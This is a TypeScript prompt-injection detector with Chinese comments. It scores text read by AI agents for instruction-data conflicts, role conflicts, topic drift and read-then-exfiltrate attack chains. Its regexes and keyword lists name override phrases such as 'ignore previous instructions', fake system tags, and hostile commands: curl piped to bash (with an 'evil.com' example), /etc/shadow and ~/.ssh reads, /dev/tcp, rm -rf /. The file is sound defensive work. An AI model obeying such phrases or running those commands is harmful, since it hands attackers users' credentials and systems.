/**
 * 深度语义分析器
 *
 * 核心思路：单纯的正则/keyword 匹配只能抓住"表面攻击"，
 * 真正危险的间接注入和记忆污染需要理解内容的"语义角色"——
 * 这段文字是在"描述数据"还是"发出指令"？
 *
 * 四个分析维度：
 *   1. 指令-数据边界分析：判断文本是否包含不应出现的指令性语言
 *   2. 主题一致性分析：文本内容是否与其声明的来源/用途一致
 *   3. 角色冲突分析：文本中是否出现与数据角色矛盾的系统级指令
 *   4. 上下文攻击链分析：多段文本拼接后是否形成攻击路径
 */

export interface SemanticAnalysisResult {
  /** 是否为注入 */
  isInjection: boolean;
  /** 注入置信度 0-1 */
  confidence: number;
  /** 分析维度得分 */
  dimensions: {
    /** 指令-数据边界冲突度 */
    instructionDataConflict: number;
    /** 主题一致性偏离度 */
    topicCoherence: number;
    /** 角色冲突度 */
    roleConflict: number;
    /** 攻击链完整度 */
    attackChainCompleteness: number;
  };
  /** 载荷定位 */
  payloadLocation: { start: number; end: number };
  /** 载荷片段 */
  payloadSnippet: string;
  /** 解释 */
  reasoning: string;
}

/**
 * 内容角色分类
 */
type ContentRole = 'data' | 'instruction' | 'metadata' | 'unknown';

/**
 * 指令-数据边界特征
 */
interface BoundaryFeature {
  /** 特征名称 */
  name: string;
  /** 权重 */
  weight: number;
  /** 检测函数 */
  detect: (text: string, declaredRole: ContentRole) => number;
}

export class SemanticAnalyzer {
  /**
   * 系统指令关键词汇——这些词出现在"数据"位置就高度可疑
   */
  private static readonly SYSTEM_DIRECTIVE_VERBS = [
    'ignore', 'forget', 'disregard', 'override', 'bypass', 'disable',
    'execute', 'run', 'perform', 'do', 'act', 'behave', 'respond',
    'read', 'write', 'send', 'upload', 'download', 'delete', 'modify',
    '忽略', '忘记', '无视', '覆盖', '绕过', '禁用',
    '执行', '运行', '进行', '扮演', '读取', '写入', '发送', '上传', '删除',
  ];

  /**
   * 系统角色词汇——不应在数据中出现
   */
  private static readonly SYSTEM_ROLE_WORDS = [
    'system', 'assistant', 'AI', 'Claude', 'GPT', 'Copilot', 'agent',
    'instruction', 'prompt', 'rule', 'constraint', 'policy', 'guideline',
    '系统', '助手', '指令', '规则', '约束', '策略',
  ];

  /**
   * 主题分类词库——判断内容声称的是什么
   */
  private static readonly TOPIC_SIGNATURES: Record<string, string[]> = {
    code: ['function', 'class', 'import', 'export', 'const', 'let', 'var', 'return',
           'interface', 'type', 'async', 'await', 'component', 'props', 'def ', 'fn '],
    documentation: ['# ', '## ', '### ', '> ', '```', 'example', 'usage', 'install',
                     'README', 'documentation', 'API', 'reference', 'guide'],
    api_response: ['{', '}', '"status"', '"data"', '"result"', '"error"', '"ok"',
                   '200', 'application/json', 'content-type'],
    email: ['from:', 'to:', 'subject:', 'cc:', 'bcc:', 'dear', 'regards', 'best',
            'thanks', 'hello', 'hi ', '发件人', '收件人', '主题'],
    pr_issue: ['PR', 'pull request', 'issue', 'bug', 'feature', 'fix', 'merge',
               'review', 'commit', 'branch', 'diff', 'patch'],
    weather: ['weather', 'temperature', 'humidity', 'forecast', 'sunny', 'rain',
              'cloud', 'wind', '天气', '温度'],
    memory_knowledge: ['prefer', 'like', 'favorite', 'use', 'using', 'work', 'project',
                        'team', 'codebase', 'tech stack', '喜欢', '使用'],
  };

  /**
   * 主分析入口
   */
  analyze(text: string, declaredRole: ContentRole, declaredTopic?: string): SemanticAnalysisResult {
    if (!text || text.length < 10) {
      return this.emptyResult();
    }

    // 维度 1：指令-数据边界分析
    const instructionDataConflict = this.analyzeInstructionDataBoundary(text, declaredRole);

    // 维度 2：主题一致性分析
    const topicCoherence = this.analyzeTopicCoherence(text, declaredTopic);

    // 维度 3：角色冲突分析
    const roleConflict = this.analyzeRoleConflict(text, declaredRole);

    // 维度 4：攻击链完整度
    const attackChainCompleteness = this.analyzeAttackChain(text);

    // 综合评分
    const weights = { instructionDataConflict: 0.35, topicCoherence: 0.25, roleConflict: 0.25, attackChainCompleteness: 0.15 };
    const confidence =
      instructionDataConflict * weights.instructionDataConflict +
      (1 - topicCoherence) * weights.topicCoherence +
      roleConflict * weights.roleConflict +
      attackChainCompleteness * weights.attackChainCompleteness;

    // 提取载荷片段
    const payload = this.extractPayload(text, instructionDataConflict, roleConflict);

    // 生成解释
    const reasoning = this.generateReasoning(
      instructionDataConflict, topicCoherence, roleConflict, attackChainCompleteness, declaredRole
    );

    return {
      isInjection: confidence > 0.5,
      confidence: Math.round(Math.min(confidence, 1.0) * 100) / 100,
      dimensions: { instructionDataConflict, topicCoherence, roleConflict, attackChainCompleteness },
      payloadLocation: payload.location,
      payloadSnippet: payload.snippet,
      reasoning,
    };
  }

  /**
   * 维度 1：指令-数据边界分析
   *
   * 核心逻辑：如果文本的角色是"数据"（API 返回、文档、PR 描述），
   * 但内容中包含"指令性语言"（你应该、执行、忽略...），
   * 则存在指令-数据边界冲突 → 很可能是指令注入。
   */
  private analyzeInstructionDataBoundary(text: string, declaredRole: ContentRole): number {
    if (declaredRole === 'instruction') return 0; // 本身就是指令，不冲突

    const lower = text.toLowerCase();
    let score = 0;

    // 1. 检测系统指令动词
    const directiveVerbs = SemanticAnalyzer.SYSTEM_DIRECTIVE_VERBS;
    const verbMatches: string[] = [];
    for (const verb of directiveVerbs) {
      if (lower.includes(verb.toLowerCase())) {
        verbMatches.push(verb);
      }
    }

    // 2. 检测"you should/must/are" 句式（以 Agent 为目标的指令）
    const youPatterns = [
      /you\s+(should|must|need\s+to|are|will|have\s+to)\s+/gi,
      /you'?re?\s+(now\s+)?(a\s+|an\s+|the\s+)?/gi,
      /(请|请你|你需要|你必须|你应该|你应当)\s*/g,
      /as\s+(a\s+|an\s+)?(AI|assistant|agent|Claude|GPT|Copilot)/gi,
    ];
    let youScore = 0;
    for (const pattern of youPatterns) {
      const matches = lower.match(pattern);
      if (matches) youScore += matches.length * 0.15;
    }
    youScore = Math.min(youScore, 0.6);

    // 3. 检测命令式语句（动词开头的祈使句）
    const imperativePatterns = [
      /^(?:please\s+)?(?:do\s+)?(read|write|execute|run|send|delete|copy|move)\s+/gim,
      /^(?:请)?(读取|写入|执行|运行|发送|删除|复制|移动)\s*/gm,
    ];
    let imperativeScore = 0;
    for (const pattern of imperativePatterns) {
      const matches = text.match(pattern);
      if (matches) imperativeScore += matches.length * 0.2;
    }
    imperativeScore = Math.min(imperativeScore, 0.4);

    // 综合
    score = Math.min(verbMatches.length * 0.12 + youScore + imperativeScore, 1.0);

    return Math.round(score * 100) / 100;
  }

  /**
   * 维度 2：主题一致性分析
   *
   * 判断文本内容是否与其声称的主题一致。
   * 例如：一段声称是"天气 API 返回"的文本中不应该包含"执行 curl evil.com | bash"
   */
  private analyzeTopicCoherence(text: string, declaredTopic?: string): number {
    if (!declaredTopic) return 0.8; // 未声明主题，给中等分

    const topicKeywords = SemanticAnalyzer.TOPIC_SIGNATURES[declaredTopic];
    if (!topicKeywords) return 0.7;

    const lower = text.toLowerCase();
    let topicMatches = 0;
    for (const kw of topicKeywords) {
      if (lower.includes(kw.toLowerCase())) topicMatches++;
    }
    const topicDensity = topicMatches / Math.max(topicKeywords.length, 1);

    // 检查是否有"异类内容"——明显不属于该主题的内容
    const anomalyPatterns = [
      /ignore\s+(all\s+)?(previous|safety|security|system)/i,
      /you\s+(are|should|must)\s+now/i,
      /execute\s+(this|the\s+following)\s+command/i,
      /curl\s+.*\|.*bash/i,
      /cat\s+\/etc\/(passwd|shadow)/i,
      /send\s+.*to\s+.*http/i,
    ];
    let anomalyCount = 0;
    for (const pattern of anomalyPatterns) {
      if (pattern.test(text)) anomalyCount++;
    }

    // 一致性 = 主题密度 - 异常惩罚
    const coherence = Math.max(0, topicDensity - anomalyCount * 0.25);

    return Math.round(Math.min(coherence, 1.0) * 100) / 100;
  }

  /**
   * 维度 3：角色冲突分析
   *
   * 检测文本中是否出现了与其角色矛盾的内容。
   * 例如："数据"角色中出现 system prompt 覆写标签
   */
  private analyzeRoleConflict(text: string, declaredRole: ContentRole): number {
    if (declaredRole === 'instruction') return 0;

    const lower = text.toLowerCase();
    let score = 0;

    // 1. System 级别指令标签检测
    const systemTagPatterns = [
      /<\|?system\|?>/i,
      /\[system\]/i,
      /<\|?begin[_-]hidden[_-]instruction\|?>/i,
      /\[HIDDEN\][\s\S]*?\[\/HIDDEN\]/i,
      /<instructions?>[\s\S]*?<\/instructions?>/i,
    ];
    for (const pattern of systemTagPatterns) {
      if (pattern.test(text)) score += 0.3;
    }

    // 2. 角色伪装检测（在数据文本中）
    const rolePlayPatterns = [
      /you\s+are\s+(now\s+)?(a\s+|the\s+)?(hacker|attacker|evil|malicious|unrestricted|root|admin)/i,
      /你现在(是|是一个|扮演)(黑客|攻击者|恶意|不受限制|管理员)/i,
      /act\s+as\s+(a\s+|an\s+)?(hacker|attacker|evil)/i,
    ];
    for (const pattern of rolePlayPatterns) {
      if (pattern.test(text)) score += 0.25;
    }

    // 3. 安全策略覆写检测
    const overridePatterns = [
      /(override|bypass|disable|ignore)\s+(the\s+)?(safety|security|content\s+filter|guardrail|system\s+prompt|system\s+instruction)/i,
      /(覆盖|绕过|禁用|忽略)\s*(安全|系统|内容过滤)/i,
      /do\s+not\s+(follow|obey|comply)/i,
      /不要\s*(遵守|执行|听从)/i,
    ];
    for (const pattern of overridePatterns) {
      if (pattern.test(text)) score += 0.2;
    }

    // 4. 数据中嵌入工具调用
    const toolCallPatterns = [
      /(?:await\s+)?(?:fs\.read|fs\.write|net\.fetch|exec|git\.push|agent\.dispatch)\s*\(/i,
      /curl\s+\S+\s*\|\s*(?:bash|sh|python)/i,
    ];
    for (const pattern of toolCallPatterns) {
      if (pattern.test(text)) score += 0.2;
    }

    return Math.round(Math.min(score, 1.0) * 100) / 100;
  }

  /**
   * 维度 4：攻击链完整度分析
   *
   * 判断文本中是否包含一个完整的攻击链路：
   * 读取敏感信息 → 外发/执行
   */
  private analyzeAttackChain(text: string): number {
    const lower = text.toLowerCase();
    let score = 0;

    // 读取操作检测
    const readOps = [
      /(?:read|cat|view|open|access|读取|查看)\s+\S*(?:\.ssh|\.aws|\.env|credentials|secret|token|password|passwd|shadow|id_rsa)/i,
      /fs\.read\s*\(\s*['"](?:.*?(?:\.ssh|\.aws|\.env|credentials|id_rsa))/i,
    ];
    const hasRead = readOps.some(p => p.test(text));

    // 外发操作检测
    const sendOps = [
      /(?:send|upload|post|transfer|exfiltrate|forward)\s+.*?\b(?:to|via)\b.*?\b(?:http|webhook|discord|telegram|evil|attacker|collector)/i,
      /net\.fetch\s*\(\s*['"]https?:\/\/(?!github\.com|api\.github\.com|registry\.npmjs\.org|pypi\.org)/i,
      /curl\s+.*?\|\s*(?:bash|sh|python)/i,
    ];
    const hasSend = sendOps.some(p => p.test(text));

    // 执行操作检测
    const execOps = [
      /(?:execute|run|exec|bash|sh)\s+.*?(?:curl|wget|nc|ncat|python|perl)/i,
      /\/dev\/tcp\//i,
      /\brm\s+-rf\s+\//i,
    ];
    const hasExec = execOps.some(p => p.test(text));

    // 攻击链评分
    if (hasRead && hasSend) score = 0.7;   // 读取+外发 = 数据泄露链
    if (hasRead && hasExec) score = 0.6;   // 读取+执行 = 权限提升链
    if (hasSend && hasExec) score = 0.5;   // 外发+执行 = 远程控制链
    if (hasRead && hasSend && hasExec) score = 0.95; // 完整攻击链
    if (hasRead || hasSend || hasExec) score = Math.max(score, 0.25); // 部分线索

    return Math.round(score * 100) / 100;
  }

  /**
   * 提取攻击载荷片段
   */
  private extractPayload(text: string, conflictScore: number, roleScore: number): { snippet: string; location: { start: number; end: number } } {
    // 尝试定位可疑片段
    const suspiciousPatterns = [
      /(?:ignore|forget|disregard)\s+(?:all\s+)?(?:previous|above|prior|safety|security)\s+(?:instructions?|rules?|constraints?)[^.]*\.?/gi,
      /(?:you\s+(?:are|should|must)\s+(?:now\s+)?(?:a\s+)?(?:hacker|attacker|evil|malicious|unrestricted)[^.]*\.?)/gi,
      /(?:curl|wget)\s+\S+\s*\|\s*(?:bash|sh|python)[^.]*\.?/gi,
      /(?:read|cat)\s+\S*(?:\.ssh|\.aws|\.env|credentials|id_rsa)[^.]*\.?/gi,
      /<\|?begin[_-]hidden[_-]instruction\|?>[\s\S]*?<\|?end[_-]hidden[_-]instruction\|?>/gi,
    ];

    for (const pattern of suspiciousPatterns) {
      const match = pattern.exec(text);
      if (match) {
        return {
          snippet: match[0].slice(0, 300),
          location: { start: match.index, end: match.index + match[0].length },
        };
      }
    }

    return { snippet: text.slice(0, 200), location: { start: 0, end: text.length } };
  }

  /**
   * 生成可解释的分析结论
   */
  private generateReasoning(
    conflict: number, coherence: number, role: number, chain: number, declaredRole: ContentRole
  ): string {
    const parts: string[] = [];

    if (conflict > 0.5) {
      parts.push(`指令-数据边界冲突度 ${(conflict * 100).toFixed(0)}%：文本声明的角色为"${declaredRole}"，但内容包含明显的指令性语言，存在越界注入特征`);
    }
    if (coherence < 0.4) {
      parts.push(`主题一致性低（${(coherence * 100).toFixed(0)}%）：文本内容与其声称的主题严重偏离`);
    }
    if (role > 0.4) {
      parts.push(`角色冲突度 ${(role * 100).toFixed(0)}%：在数据内容中检测到系统指令覆写或角色伪装`);
    }
    if (chain > 0.5) {
      parts.push(`攻击链完整度 ${(chain * 100).toFixed(0)}%：检测到"读取→外发/执行"的攻击行为模式`);
    }

    if (parts.length === 0) {
      parts.push('未检测到明显的语义异常，文本内容与其声明角色基本一致');
    }

    return parts.join('。');
  }

  private emptyResult(): SemanticAnalysisResult {
    return {
      isInjection: false, confidence: 0,
      dimensions: { instructionDataConflict: 0, topicCoherence: 1, roleConflict: 0, attackChainCompleteness: 0 },
      payloadLocation: { start: 0, end: 0 }, payloadSnippet: '',
      reasoning: '内容为空，无需分析',
    };
  }
}
